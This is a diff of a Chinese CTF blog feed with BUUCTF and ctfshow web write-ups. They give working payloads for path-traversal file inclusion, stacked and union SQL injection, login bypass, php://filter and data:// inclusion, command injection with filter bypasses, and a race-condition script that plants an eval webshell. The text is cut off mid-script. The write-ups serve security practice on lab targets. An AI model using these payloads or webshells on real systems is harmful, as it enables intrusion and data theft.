empty($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#39;file&#39;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
-<p>先根据提示的 hint.php 得到信息</p>
-<p><code>flag not here, and flag in ffffllllaaaagggg</code></p>
-<p>看看几个需要知道的函数</p>
-<p>1.mb_substr()</p>
-<p><img src="https://img-blog.csdnimg.cn/20210114212509625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>2.mb_strpos</p>
-<p><img src="https://img-blog.csdnimg.cn/20210114212747465.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>先分析 emmm这个类</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class emmm</span><br><span class="line">&#123;</span><br><span class="line">    public static function checkFile(&amp;$page)</span><br><span class="line">    &#123;</span><br><span class="line">        $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];</span><br><span class="line">        if (! isset($page) || !is_string($page)) &#123;  &#x2F;&#x2F;page必须不为空或为字符串</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (in_array($page, $whitelist)) &#123;  &#x2F;&#x2F;in_array()检测page是否在whitelist中</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page &#x3D; mb_substr(  &#x2F;&#x2F;如果page含有?，则获取page第一个?前的值并赋给_page变量</span><br><span class="line">            $page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($page . &#39;?&#39;, &#39;?&#39;)</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;  &#x2F;&#x2F;检测_page是否在whitelist中</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $_page &#x3D; urldecode($page);  &#x2F;&#x2F;给_page二次赋值，使其等于URL解码之后的page</span><br><span class="line">        $_page &#x3D; mb_substr(&#x2F;&#x2F;得到hint(source).php</span><br><span class="line">            $_page,</span><br><span class="line">            0,</span><br><span class="line">            mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)  &#x2F;&#x2F;如果_page有?，则截取_page(URL解码后的page)两个?中间的值</span><br><span class="line">        );</span><br><span class="line">        if (in_array($_page, $whitelist)) &#123;  &#x2F;&#x2F;检测_page是否在whitelist中</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以看到函数代码中有四个if语句：</p>
-<p><em><strong>第一个if语句</strong></em> 对变量进行检验，要求$page为字符串，否则返回false <em>//因为返回False所以这里无用</em><br>
-<em><strong>第二个if语句</strong></em> 判断$page是否存在于$whitelist数组中，存在则返回true<br>
-<em><strong>第三个if语句</strong></em> 判断截取后的$page是否存在于$whitelist数组中，截取$page中’?'前部分，存在则返回true<br>
-<em><strong>第四个if语句</strong></em> 判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true<br>
-若以上四个if语句均未返回值，则返回false</p>
-<p>有三个if语句可以返回true，第二个语句直接判断$page，不可用</p>
-<p>第三个语句截取’?'前部分，由于?被后部分被解析为get方式提交的参数，也不可利用</p>
-<p>第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?'，仍可通过第四个if语句校验。</p>
-<p><strong>只要这四个if语句有一个为true即可包含file</strong>，关键点在_page 经过截断后返回true.</p>
-<p>所以我们的突破点就在于第四个if语句中，只要满足他的条件，我们就可以包含文件：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_page &#x3D; urldecode($page); </span><br><span class="line">$_page &#x3D; mb_substr(</span><br><span class="line">　　$_page,</span><br><span class="line">　　0,</span><br><span class="line">　　mb_strpos($_page . &#39;?&#39;, &#39;?&#39;) &#x2F;&#x2F;得到hint(source).php的最后位置</span><br><span class="line">);if (in_array($_page, $whitelist)) &#123; </span><br><span class="line">　　return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里URL解码了一次$page值，这里需要注意的是，<em><strong>PHP中$_GET、$_POST、$_REQUEST这类函数在提取参数值时会URL解码一次</strong></em></p>
-<p>而这里在代码中又一次URL解码了一次，共计解码了两次，所以我们也需要对传入的值进行两次URL编码</p>
-<p>其次我们的突破点就在于这段代码只会截取?之前的字符串拿去和whitelist比对，因此只要确保?前的值是source.php或hint.php即可返回true</p>
-<p>等同于 /source.php?file=source.php%253Fxxxx 便可以使用include()函数包含 source.php?xxxx 这个文件(%253f是?URL编码两次后的值)</p>
-<p>所以可以构造Payload:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index.php?file&#x3D;source.php%253F&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-<p>需要注意的是，这里之所以可以包含到ffffllllaaaagggg是因为PHP将 source.php%253F/ 视作了一个文件夹，然后 …/ 的用途是返回上级目录</p>
-<p>ffffllllaaaagggg位于根目录下，一般Web服务的文件夹在/var/www/html目录中，再加上source.php?/这个“文件夹”，所以我们总共需要…/四次来返回到根目录  当然你也可以用…/更多次 毕竟是在根目录</p>
-<p>参考:<a href="https://www.cnblogs.com/yesec/p/12635274.html">https://www.cnblogs.com/yesec/p/12635274.html</a></p>
-<h1>[强网杯 2019]随便注</h1>
-<p>单引号试探</p>
-<p><img src="https://img-blog.csdnimg.cn/20210114141920393.png" alt="在这里插入图片描述"></p>
-<p>然后 1’# 成功回显，发现并没有过滤注释符</p>
-<p><code>1'order by 2#</code>检测发现两个字段</p>
-<p>使用联合注入的时候发现大部分的注入方法都被过滤了</p>
-<p><img src="https://img-blog.csdnimg.cn/20210114141947895.png" alt="在这里插入图片描述"></p>
-<p>用sqlmap跑了一下得到库名: supersqli</p>
-<p>后面发现可以使用堆叠注入</p>
-<p>查出表名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show tables from supersqli;#</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210114142009224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>查字段名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show columns from words;#</span><br></pre></td></tr></table></figure>
-<p>这个表好像没什么可以用的信息,有两个字段  id和data</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;show columns from &#96;1919810931114514&#96;;#</span><br></pre></td></tr></table></figure>
-<p>注意：在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符</p>
-<p>eg.  mysql&gt; SELECT * FROM   <code>table</code>   WHERE  <code>id</code> = ‘123’ ;</p>
-<p>1919810931114514必须用反单引号括起来，但是words不需要，我也不知道为什么,向大佬求解</p>
-<p>这个表中发现字段flag</p>
-<p><img src="https://img-blog.csdnimg.cn/20210114142029194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>之前不是通过 order by查询是有两个字段吗 ,可以猜测到现在sql语句查询的是word这个表里面的数据</p>
-<p>接下来就是用各种膜拜大佬们的wp,下面这个是很骚的解法</p>
-<h2 id="解法一-改名"><a class="header-anchor" href="#解法一-改名">¶</a>解法一:改名</h2>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id，结合上面的1&#39; or 1&#x3D;1#爆出表所有内容就可以查flag啦</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">修改表名:RENAME TABLE &lt;旧表名&gt; TO &lt;新表名&gt;;</span><br><span class="line">修改字段名:alter table &lt;表名&gt; change &lt;字段名&gt; &lt;字段新名称&gt; &lt;字段的类型&gt;</span><br></pre></td></tr></table></figure>
-<p><strong>payload:</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;;alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; VARCHAR(50);#</span><br></pre></td></tr></table></figure>
-<p>然后 <code>1' or 1=1 #</code> 爆出flag</p>
-<h2 id="解法二-预处理语句-堆叠注入"><a class="header-anchor" href="#解法二-预处理语句-堆叠注入">¶</a>解法二:预处理语句+堆叠注入</h2>
-<p>先了解预处理语句</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字供之后调用</span><br><span class="line">EXECUTE ：执行命令</span><br><span class="line">DEALLOCATE PREPARE：释放命令</span><br></pre></td></tr></table></figure>
-<p>测试</p>
-<p><img src="https://img-blog.csdnimg.cn/20210114142049172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;set @sql&#x3D;concat(&#39;s&#39;,&#39;elect &#96;flag&#96; from &#96;1919810931114514&#96;&#39;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;#</span><br></pre></td></tr></table></figure>
-<p>或者</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;;SET @sqli&#x3D;concat(char(115,101,108,101,99,116),&#39;* from &#96;1919810931114514&#96;&#39;);PREPARE hacker from @sqli;EXECUTE hacker;#</span><br></pre></td></tr></table></figure>
-<p>参考:<a href="https://www.jianshu.com/p/6c6a44517dd7">https://www.jianshu.com/p/6c6a44517dd7</a></p>
-<h1>[极客大挑战 2019]EasySQL</h1>
-<p>测试得到是单引号闭合</p>
-<p>万能密码就能爆出flag</p>
-<p><strong>payload:</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uername:-1</span><br><span class="line">password: 1&#39;or 1 &#x3D;1%23</span><br></pre></td></tr></table></figure>
-<h1>[极客大挑战 2019]Havefun</h1>
-<p>查看源码,发现代码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$cat&#x3D;$_GET[&#39;cat&#39;];</span><br><span class="line">echo $cat;</span><br><span class="line">if($cat&#x3D;&#x3D;&#39;dog&#39;)&#123;</span><br><span class="line">echo &#39;Syc&#123;cat_cat_cat_cat&#125;&#39;;&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
-<p>原来感觉是命令执行…随便穿了一个dog就出flag了。。。。</p>
-<h1>[SUCTF 2019]EasySQL</h1>
-<p>尝试看看 查询当前数据库名</p>
-<p><img src="https://ae01.alicdn.com/kf/U85c1a3fe2bba44bd97aa4c685f4285d5R.jpg" alt=""></p>
-<p>测试可以发现我们输入数据的位置应该在  select x,x,x from aaaaaa 的 x 位置</p>
-<p>输入 *,1 尝试 直接读出来了。。。。。估计是非预期</p>
-<p>接着我尝试堆叠注入  <code>1;show tables;</code> 发现flag这个表,再去读的时候发现过滤了 from。。。不会了 看看大佬的wp吧</p>
-<p>内置的sql语句为<code>sql =&quot;select&quot;.post[‘query’].&quot;||flag from Flag&quot;;</code></p>
-<p>payload:</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">set</span> sql_mode<span class="operator">=</span>PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p>补充系统变量@@sql_modesql_mode：是一组mysql支持的基本语法及校验规则<br>
-PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p>
-<p>将sql_mode设置为PIPES_AS_CONCAT的话，||就不再是逻辑or了，而变成了字符串连接符。<br>
-因此设置之后<code>select 1||flag from Flag</code>就变成了将<code>select 1 from Flag</code>和<code>select flag from Flag</code>的结果拼接到一起了。而且使用字母连接会报错，使用数字连接才会查询出数据。</p>
-<p>本地测试一下:</p>
-<p><img src="https://ae01.alicdn.com/kf/U265bf89c1aa54e8bb93494551df95390F.jpg" alt=""></p>
-<h1>[ACTF2020 新生赛]Include</h1>
-<p>打开题目 tips</p>
-<p>发现地址栏有个file参数 明显的文件包含</p>
-<p>尝试读取  …/…/…/…/…/etc/passwd  ,可以成功</p>
-<p>payload</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<h1>[极客大挑战 2019]Secret File</h1>
-<p>打开题目右键查看源码</p>
-<p>发现 Archi ve_room.php</p>
-<p>然后 点进去源码又发现action.php</p>
-<p>然后会重定向到 end.php</p>
-<p>bp抓包 发现 secr3t.php  发现源码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file&#x3D;$_GET[&#39;file&#39;];</span><br><span class="line">    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">&#x2F;&#x2F;flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-<p>伪协议读取得到flag</p>
-<p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<h1>[极客大挑战 2019]LoveSQL</h1>
-<p>打开题目 order by发现字段为3</p>
-<p>查表: 有两个</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;d&amp;password&#x3D;1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210114165135624.png" alt="在这里插入图片描述"></p>
-<p>查表 l0ve1ysq1 的列名</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;d&amp;password&#x3D;1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;l0ve1ysq1&#39;%23</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210114165050773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>查数据得到flag  但是我竟然蠢到用 limit 读取。。。。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&amp;password&#x3D;1&#39; union select 2,2,password from &#96;l0ve1ysq1&#96; limit 15,1%23</span><br></pre></td></tr></table></figure>
-<p>可以用 group_concat</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&amp;password&#x3D;1&#39; union select 2,2,group_concat(password) from &#96;l0ve1ysq1&#96;%23</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">group_concat()函数</span><br><span class="line">1、功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</span><br><span class="line">2、语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc&#x2F;desc  ] [separator &#39;分隔符&#39;] )</span><br><span class="line">说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</span><br></pre></td></tr></table></figure>
-<h1>[GXYCTF2019]Ping Ping Ping</h1>
-<p>打开题目发现是rce</p>
-<p>尝试读取:  没有过滤分号</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;ls</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210114234736150.png" alt="在这里插入图片描述"></p>
-<p>直接cat flag.php 不行 估计是flag被过滤了使用变量拼接  发现空格被过滤 使用 $IFS$9 绕过</p>
-<p>payload:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$9fla$a.php</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>刷题站</category>
-        <category>buuctf</category>
       </categories>
   </entry>
   <entry>
@@ -718,6 +439,138 @@ payload: cat flag.php||</p>
       </categories>
   </entry>
   <entry>
+    <title>ctfshow入门文件包含部分</title>
+    <url>/2020/12/20/%5Bctfshow%5Dweb%E5%85%A5%E9%97%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<p>ctfshow web入门 文件包含部分</p>
+<a id="more"></a>
+<h2 id="web-78"><a class="header-anchor" href="#web-78">¶</a>web 78</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<h2 id="web-79"><a class="header-anchor" href="#web-79">¶</a>web 79</h2>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload: ?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;</span><br></pre></td></tr></table></figure>
+<h2 id="web-80-81"><a class="header-anchor" href="#web-80-81">¶</a>web 80-81</h2>
+<p>试了试文件日志包含漏洞</p>
+<p>先抓包,发现是nginx，一般的日志路径为  <code>/var/log/nginx/access.log</code></p>
+<p>访问发现成功</p>
+<p>进行getshell  先ls (可能需要多go几次)</p>
+<p><a href="https://imgchr.com/i/sClU7n"><img src="https://s3.ax1x.com/2021/01/03/sClU7n.png" alt="sClU7n.png"></a></p>
+<p>得到flag</p>
+<p><a href="https://imgchr.com/i/sClscF"><img src="https://s3.ax1x.com/2021/01/03/sClscF.png" alt="sClscF.png"></a></p>
+<h2 id="web82-86"><a class="header-anchor" href="#web82-86">¶</a>web82-86</h2>
+<p><strong>这题是利用 session.upload_progress 包含文件漏洞</strong></p>
+<p>session.upload_progress在php5.4添加的。</p>
+<p>在php.ini有以下几个默认选项</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. session.upload_progress.enabled &#x3D; on</span><br><span class="line">2. session.upload_progress.cleanup &#x3D; on</span><br><span class="line">3. session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;</span><br><span class="line">4. session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line">5. session.upload_progress.freq &#x3D; &quot;1%&quot;</span><br><span class="line">6. session.upload_progress.min_freq &#x3D; &quot;1&quot;</span><br></pre></td></tr></table></figure>
+<ol>
+<li>
+<p><code>enabled=on</code>表示<code>upload_progress</code>功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</p>
+</li>
+<li>
+<p><code>cleanup=on</code>表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</p>
+</li>
+<li>
+<p><code>name</code>当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</p>
+<p><a href="https://imgchr.com/i/sCl27R"><img src="https://s3.ax1x.com/2021/01/03/sCl27R.png" alt="sCl27R.png"></a></p>
+</li>
+<li>
+<p><code>prefix+name</code>将表示为session中的键名</p>
+</li>
+</ol>
+<p>另外，再添加个session配置中一个重要选项。</p>
+<p><code>session.use_strict_mode=off</code>这个选项默认值为off，表示我们对Cookie中sessionid可控。</p>
+<p><strong>分析</strong></p>
+<p>如果<strong>session.auto_start=On</strong> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行<strong>session_start()</strong>。但默认情况下，这个选项都是关闭的。但session还有一个默认选项，<strong>session.use_strict_mode</strong>默认值为0。此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>
+<p>但是问题来了，默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空，</p>
+<p>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p>
+<p><strong>session文件默认存储路径</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/<span class="keyword">var</span>/lib/php/sess_PHPSESSID</span><br><span class="line">/<span class="keyword">var</span>/lib/php/sessions/sess_PHPSESSID</span><br><span class="line">/tmp/sess_PHPSESSID</span><br><span class="line">/tmp/sessions/sess_PHPSESSID</span><br></pre></td></tr></table></figure>
+<p>进入正题</p>
+<p><strong>题目源码:</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">\# -*- coding: utf-8 -*-</span><br><span class="line">\# @Author: h1xa</span><br><span class="line">\# @Date:  2020-09-16 11:25:09</span><br><span class="line">\# @Last Modified by:  h1xa</span><br><span class="line">\# @Last Modified time: 2020-09-16 19:34:45</span><br><span class="line">\# @email: h1xa@ctfer.com</span><br><span class="line">\# @link: https:&#x2F;&#x2F;ctfer.com</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;file&#39;]))&#123;</span><br><span class="line">  $file &#x3D; $_GET[&#39;file&#39;];</span><br><span class="line">  $file &#x3D; str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">  $file &#x3D; str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">  $file &#x3D; str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">  $file &#x3D; str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">  include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>以POST的形式发包，上传的文件随意,下面是构造的上传表单</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;79b5dbc7-b641-4e30-b8d9-4278f2234938.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>抓包，这里我们添加一个 Cookie :PHPSESSID=flag ，session文件的位置我们根据上文的常见的几个测试，在/tmp/sess_PHPSESSID下成功访问且不报错，说明在/tmp/sess_PHPSESSID目录下, 所以PHP将会在服务器上创建一个文件：/tmp/sess_flag”    然后我们在PHP_SESSION_UPLOAD_PROGRESS下添加我们的执行代码，修改如下</p>
+<p><a href="https://imgchr.com/i/sClocD"><img src="https://s3.ax1x.com/2021/01/03/sClocD.png" alt="sClocD.png"></a></p>
+<p>因为我们在上面这个页面添加的ID值是flag，所以传参?file=/tmp/sess_flag,抓包</p>
+<p>修改如下：这个a是随便加的，主要是为了方便爆破</p>
+<p><a href="https://imgchr.com/i/sClj4P"><img src="https://s3.ax1x.com/2021/01/03/sClj4P.png" alt="sClj4P.png"></a></p>
+<p>两个包payload设置如下</p>
+<p><a href="https://imgchr.com/i/sC1SgS"><img src="https://s3.ax1x.com/2021/01/03/sC1SgS.png" alt="sC1SgS.png"></a></p>
+<p>条件竞争，将POST的包和传file的包都开启爆破，即可得到目录</p>
+<p><a href="https://imgchr.com/i/sC1PBj"><img src="https://s3.ax1x.com/2021/01/03/sC1PBj.png" alt="sC1PBj.png"></a></p>
+<p>同理也能得到flag</p>
+<p><a href="https://imgchr.com/i/sC1ZCV"><img src="https://s3.ax1x.com/2021/01/03/sC1ZCV.png" alt="sC1ZCV.png"></a></p>
+<p><strong>也可以使用python脚本</strong></p>
+<p>也直接用前面文章里的脚本：</p>
+<p>附上大佬的脚本</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import io</span><br><span class="line">import sys</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;Qftm&#x27;</span></span><br><span class="line"></span><br><span class="line">def POST(session):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            <span class="string">&#x27;http://250307c3-cf87-4811-987f-20189fa2442c.chall.ctf.show/&#x27;</span>,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php system(&#x27;cat *&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval(<span class="subst">$_POST</span>[mtfQ])?&gt;&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span 